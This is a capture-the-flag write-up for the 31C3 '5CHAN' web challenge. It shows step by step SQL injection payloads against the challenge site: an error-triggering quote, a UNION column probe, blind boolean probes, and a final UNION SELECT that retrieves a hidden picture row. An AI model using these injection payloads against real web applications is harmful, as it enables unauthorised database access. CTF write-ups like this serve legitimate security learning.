## 31C3 CTF - 5CHAN (Web 15)
##### 27-29/12/2014 (48hr)
___
### Description
5CHAN? never heard of this image board, but they have exactly what we need, 
the picture we're looking for is not for public, so can you get it?

http://188.40.18.89/

___
### Solution

First, we check for SQLi: http://188.40.18.89/?page=pic&id=0'
Yeah!

```
	Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given 
	in /var/www/html/__pages/__pic.php on line 8
```

Try to guess columns:
```
	http://188.40.18.89/?page=pic&id=2 UNION ALL SELECT 0x61,0x61,0x61,0x61,0x61
```

Returns no error.

Now make a blind attack to get column and table names:
```
	http://188.40.18.89/?page=pic&id=(SELECT 1) --> return system of a dawn
	http://188.40.18.89/?page=pic&id=(SELECT 0) --> return nothing

	users   : id_user,username,password,level
	pictures: id, title, name,desc, level 
```
	
After that we can get that there are 2 tables: pictures and users. pictures table has 9
rows, where the 9th row contains the column. However the image is doesn't stored on the
table, so we have to get it from the URL:
```
	http://188.40.18.89/?page=pic&id=0 UNION ALL SELECT * FROM pictures WHERE id=9 -- x
```
___